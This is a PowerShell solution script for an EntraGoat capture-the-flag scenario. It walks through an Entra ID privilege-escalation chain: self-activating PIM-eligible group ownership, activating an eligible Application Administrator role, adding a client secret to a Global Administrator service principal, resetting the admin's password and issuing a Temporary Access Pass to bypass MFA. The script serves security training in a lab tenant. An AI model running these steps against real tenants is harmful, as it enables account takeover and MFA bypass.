<#
.SYNOPSIS
EntraGoat Scenario 4: Walkthrough solution step-by-step

.DESCRIPTION
________________________________________________________________________________________________________________________________________________
Scenario 4 - I (Eligibly) Own That

Attack flow:

1. The attacker starts as a low-privileged IT support user (Woody Chen).
   He has PIM-eligible ownership of the group "Application Operations Team".

2. Activate eligible ownership and since group owners can manage group membership.
   add yourself (Woody) as a member of the "Application Operations Team" group.

3. That group has an ELIGIBLE Application Administrator directory role.
   Activate the group's eligible Application Administrator assignment via PIM.

4. With Application Administrator, manage the "Infrastructure Monitoring Tool" application:
   Add a client secret to the application and authenticate as the app.

5. The service principal of "Infrastructure Monitoring Tool" is a member of
   the "Global Infrastructure Team" group which has Global Administrator privileges.
 
6. Using these privileges, the attacker resets the admin's password and then logs in to retrieve the scenario flag.

- - -

--> So... why this works?
- PIM eligibility for ownership enables self-service elevation to group ownership.
- Ownership permits adding self as group member.
- The group's eligible Application Administrator role can be activated via PIM.
- Application Administrator can add credentials to enterprise apps.
- Service principal sits in a group with Global Administrator rights.
- GA privilege allows resetting another user's credentials, even if it's a GA.
________________________________________________________________________________________________________________________________________________

.NOTES
Requires: Get-MSGraphTokenWithUsernamePassword function from BARK (https://github.com/BloodHoundAD/BARK)
you must have the function/BARK toolkit loaded in PS memory to use this function but other tools (or Connect-MgGraph) can be used as well.
#>


# Step 1: Authentication as woody.chen
$UPN = "woody.chen@[YOUR-TENANT-DOMAIN].onmicrosoft.com"
$tenantId = "[YOUR-TENANT-ID]"
$password = "GoatAccess!123"

Connect-MgGraph -Scopes "RoleEligibilitySchedule.Read.Directory"

Get-MgContext

$currentUser = Get-MgUser -Filter "userPrincipalName eq '$UPN'"

# Step 2: Enumeration 
# any owned directory objects by this user? (should be empty)
Get-MgUserOwnedObject -UserId $currentUser.Id -All

# any active role assignments?
Get-MgRoleManagementDirectoryRoleAssignment -Filter "principalId eq '$($currentUser.Id)'" | Select-Object RoleDefinitionId 

# what groups are we a member of (if any)?
$groupIDs = Get-MgUserMemberOf -UserId $currentUser.Id -All
foreach ($groupID in $groupIDs) {
    Get-MgGroup -GroupId $groupID.Id
}

# what about PIM eligible group assignments?
$eligibilities = Invoke-MgGraphRequest -Method GET `
    -Uri "https://graph.microsoft.com/beta/identityGovernance/privilegedAccess/group/eligibilitySchedules?`$filter=principalId eq '$($currentUser.Id)'"

$eligibilities.value

# eligible owner. Lets check the group (should be "Application Operations Team"):

$groupID = $eligibilities.value.groupId
$group = Get-MgGroup -GroupId $groupID
$group

# Does the group have any directory role assignments?
# $roleAssignments = Invoke-MgGraphRequest -Method GET -Uri "https://graph.microsoft.com/beta/roleManagement/directory/roleAssignments?`$filter=principalId eq '$($group.Id)'&`$expand=roleDefinition"
$roleAssignments = Get-MgRoleManagementDirectoryRoleAssignment  -Filter "principalId eq '$($group.Id)'" -ErrorAction SilentlyContinue
foreach ($assignment in $roleAssignments.value) {
    Write-Host "  Role: $($assignment.roleDefinition.displayName)" 
}

# What about any eligible roles?
# $eligibleRoles = Invoke-MgGraphRequest -Method GET -Uri "https://graph.microsoft.com/beta/roleManagement/directory/roleEligibilitySchedules?`$filter=principalId eq '$($group.Id)'&`$expand=roleDefinition"
$eligibleRoles = Get-MgRoleManagementDirectoryRoleEligibilitySchedule -Filter "principalId eq '$($group.Id)'" -ErrorAction SilentlyContinue
foreach ($eligibleRole in $eligibleRoles) {
    $roleDef = Get-MgRoleManagementDirectoryRoleDefinition -UnifiedRoleDefinitionId $eligibleRole.RoleDefinitionId
    Write-Host "  Eligible Role: $($roleDef.DisplayName)" 
}

# Eligible Role: Application Administrator!



# Step 3: Building the attack chain

<#
well, just like in scenario 3 but with 2 extra steps:
    1. Activate eligible ownership of "Application Operations Team" group and add ourselves as member
    2. Activate the group's eligible Application Administrator role
    from there, we can add creds to any service principal in the tenant, which we'll focus again on SP with PRA, PAA or GA roles for simplicity.
#>

# Before activating anything that could generate noise, 
# let's list all SPs in the tenant that have PRA, PAA or GA roles assigned to verify that our attack path actually leads to an endpoint in the chain.
$roleMap = @{
    "62e90394-69f5-4237-9190-012177145e10" = "Global Administrator"
    "7be44c8a-adaf-4e2a-84d6-ab2649e08a13" = "Privileged Authentication Administrator"
    "e8611ab8-c189-46e8-94e1-60213ab1f814" = "Privileged Role Administrator"
}

Get-MgRoleManagementDirectoryRoleAssignment -All |
  Where-Object { $roleMap.Keys -contains $_.RoleDefinitionId } |
  ForEach-Object  { Get-MgServicePrincipal -ServicePrincipalId $_.PrincipalId -ErrorAction SilentlyContinue } |
  Sort-Object Id -Unique |
  Select-Object DisplayName, AppId, Id

# (None should be returned)

# BUT as seen in scenario 3, 
# We should also enumerate each group holding these roles and identify which of their members are service principals.
$allRoleGroups = Get-MgGroup -All -Filter "isAssignableToRole eq true"
$privilegedGroups = @()
foreach ($group in $allRoleGroups) {
    $roles = Get-MgRoleManagementDirectoryRoleAssignment -Filter "principalId eq '$($group.Id)'" |
             Select-Object -Expand RoleDefinitionId

    if ($roles -contains "62e90394-69f5-4237-9190-012177145e10") {
        Write-Host "$($group.DisplayName) has role: GA" -ForegroundColor Yellow
        $privilegedGroups += $group
    }
    elseif ($roles -contains "7be44c8a-adaf-4e2a-84d6-ab2649e08a13") {
        Write-Host "$($group.DisplayName) has role: PAA" -ForegroundColor Yellow
        $privilegedGroups += $group
    }
    elseif ($roles -contains "e8611ab8-c189-46e8-94e1-60213ab1f814") {
        Write-Host "$($group.DisplayName) has role: PRA" -ForegroundColor Yellow
        $privilegedGroups += $group
    }
}

# quick wrapper to list all members of a group (handles SPs too - uses /beta)
# as Get-MgGroupMember doesn't show SPs on v1.0, so we use a direct API call instead
function Get-GroupMembers {
    param([string]$GroupId)
    return (Invoke-MgGraphRequest -Uri "/beta/groups/$GroupId/members" -Method GET).value
}

# Find SP members in those groups
$targetSPs = @() 
foreach ($group in $privilegedGroups) {
    $members = Get-GroupMembers -GroupId $group.Id
    $spMembers = $members | Where-Object { $_.'@odata.type' -eq '#microsoft.graph.servicePrincipal' }
    foreach ($sp in $spMembers) {
        $targetSPs += [PSCustomObject]@{
            Name = $sp.displayName
            SPId = $sp.id
            AppId = $sp.appId
            GroupName = $group.DisplayName
        }
    }
}
$targetSPs

# Found - Infrastructure Monitoring Tool!

<#
Note:
    Depending on the tenant, there may be multiple service principals holding the PRA, PAA or GA roles. 
    While we could just grab the first result ($targetSPs[0]), for consistency across environments (and to avoid breaking anything)
    we'll target the Infrastructure Monitoring Tool service principal. This SP is guaranteed to exist in every tenant, ensuring all players follow the same path.
#>


# Step 5: Executing the attack path 

# The first step is to activate eligible ownership of "Application Operations Team" group and add ourselves as members
$appOpsGroup = Get-MgGroup -Filter "displayName eq 'Application Operations Team'"

<#
The following step can also be done via the UI:
    1. entra.microsoft.com -> ID Governance -> Privileged Access Management -> My roles -> Groups
    2. Eligible assignments tab
    3. Click Activate on the wanted group -> fill Reason ("very important tasks ahead") -> Activate.
    4. Wait ~ 30 seconds -> re-sign-in or refresh token; role shows as Active.
    5. Add self as member through group management.

    Read the blog post for more details and pretty screenshots!
#>

$ownerActivationParams = @{
    accessId         = "owner"
    principalId      = $currentUser.Id
    groupId          = $appOpsGroup.Id
    action           = "selfActivate"
    scheduleInfo     = @{
        startDateTime = (Get-Date).ToUniversalTime().ToString("o")
        expiration    = @{ 
            type = "afterDuration"
            duration = "PT8H"
        }
    }
    justification    = "Application team coordination reconfiguration tasks"
}

Invoke-MgGraphRequest -Method POST `
    -Uri "https://graph.microsoft.com/beta/identityGovernance/privilegedAccess/group/assignmentScheduleRequests" `
    -Body $ownerActivationParams -ContentType "application/json"

# wait for activations to complete - this may take few minutes

# Add ourselves to the group as member
$memberParams = @{
    "@odata.id" = "https://graph.microsoft.com/v1.0/users/$($currentUser.Id)"
}
New-MgGroupMemberByRef -GroupId $appOpsGroup.Id -BodyParameter $memberParams # if you get "Insufficient privileges" error, consider refreshing your token or waiting a bit more.

# verify groups membership (should be Application Operations Team):
$groupIDs = Get-MgUserMemberOf -UserId $currentUser.Id -All
foreach ($groupID in $groupIDs) {
    Get-MgGroup -GroupId $groupID.Id
}

# Activate the group's eligible Application Administrator role
$roleActivationParams = @{
    action           = "selfActivate"
    principalId      = $currentUser.Id
    roleDefinitionId = $appAdminRoleId
    directoryScopeId = "/"
    scheduleInfo     = @{
        startDateTime = (Get-Date).ToUniversalTime().ToString("o")
        expiration    = @{
            type     = "afterDuration"
            duration = "PT8H"
        }
    }
    justification    = "just another task that requires Application administration"
}

# we use the directory roles endpoint instead of the group endpoint since its OUR eligible role assignment (which we got through membership) that we are activating.
Invoke-MgGraphRequest -Method POST `
    -Uri "https://graph.microsoft.com/beta/roleManagement/directory/roleAssignmentScheduleRequests" `
    -Body $roleActivationParams -ContentType "application/json"

# Check current active role assignments (should be one entry with the app admin GUID - 9b895d92-2cd3-44c7-9d02-a6ac2d5ea5c3)
Get-MgRoleManagementDirectoryRoleAssignment -Filter "principalId eq '$($currentUser.Id)'" | Select-Object RoleDefinitionId 

# Refresh token if needed
Disconnect-MgGraph

Connect-MgGraph
# Connect-MgGraph -AccessToken (ConvertTo-SecureString ((Get-MSGraphTokenWithUsernamePassword -Username $UPN -Password $password -TenantID $tenantId).access_token) -AsPlainText -Force)


# Step 4: Pivoting into the service principal's context
# lets find the target SP and add client secret to it
$SP = Get-MgServicePrincipal -Filter "displayName eq 'Infrastructure Monitoring Tool'"

$secretDescription = "EntraGoat-Secret-$(Get-Date -Format 'yyyyMMdd-HHmmss')"
$passwordCredential = @{
    DisplayName = $secretDescription
    EndDateTime = (Get-Date).AddYears(1)
}

$newSecret = Add-MgServicePrincipalPassword -ServicePrincipalId $SP.Id -PasswordCredential $passwordCredential

# Save the added secret details
$clientSecret = $newSecret.SecretText

$tenantId = (Get-MgOrganization).Id

# Disconnect current user session 
Disconnect-MgGraph

# Authenticate as the SP using app-only flow
$secureSecret = ConvertTo-SecureString -String $clientSecret -AsPlainText -Force
$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $SP.AppId, $secureSecret
Connect-MgGraph -TenantId $tenantId -ClientSecretCredential $credential

Get-MgContext

# Find the admin user details
$targetAdmin = Get-MgUser -Filter "startswith(userPrincipalName, 'EntraGoat-admin-s4')"


# Step 5: Account takeover
# We have GA privileges, so lets reset the admin password
$newAdminPassword = "EntraGoat-$(Get-Date -Format 'yyyyMMdd-HHmmss')!"
$passwordProfile = @{
    Password = $newAdminPassword
    ForceChangePasswordNextSignIn = $false
}

Update-MgUser -UserId $targetAdmin.Id -PasswordProfile $passwordProfile
$newAdminPassword

# Alternative: Temporary Access Pass (TAP) is a time-limited passcode that can be used to authenticate without MFA. 
# We can set TAP for the GA to bypass current MFA requirements and sign in directly to the Azure portal with it. 
$tempAccessPass = @{
     "@odata.type" = "#microsoft.graph.temporaryAccessPassAuthenticationMethod"
     "lifetimeInMinutes" = 60
     "isUsableOnce" = $false
 }
$TAP = New-MgUserAuthenticationTemporaryAccessPassMethod -UserId $targetAdmin.Id -BodyParameter $tempAccessPass
$TAP.TemporaryAccessPass   # log in as the admin user with the TAP to Azure Portal      

Disconnect-MgGraph

# Authenticate as the compromised admin with BARK
Connect-MgGraph -AccessToken (ConvertTo-SecureString ((Get-MSGraphTokenWithUsernamePassword -Username $targetAdmin.UserPrincipalName -Password $newAdminPassword -TenantID $tenantId).access_token) -AsPlainText -Force)    

# Verify admin authentication
Get-MgContext

Invoke-MgGraphRequest -Uri 'https://graph.microsoft.com/v1.0/me?$select=id,userPrincipalName,onPremisesExtensionAttributes' |
    Select-Object @{n='UPN';e={$_.userPrincipalName}},
                  @{n='Id';e={$_.id}},
                  @{n='Flag';e={$_.onPremisesExtensionAttributes.extensionAttribute1}}


Disconnect-MgGraph

# Don't forget to run the cleanup script to restore the tenant to it's original state!
# To learn more about how the scenario is created, consider running the setup script with the -Verbose flag and reviewing the its source code.

# Official blog post: https://www.semperis.com/blog/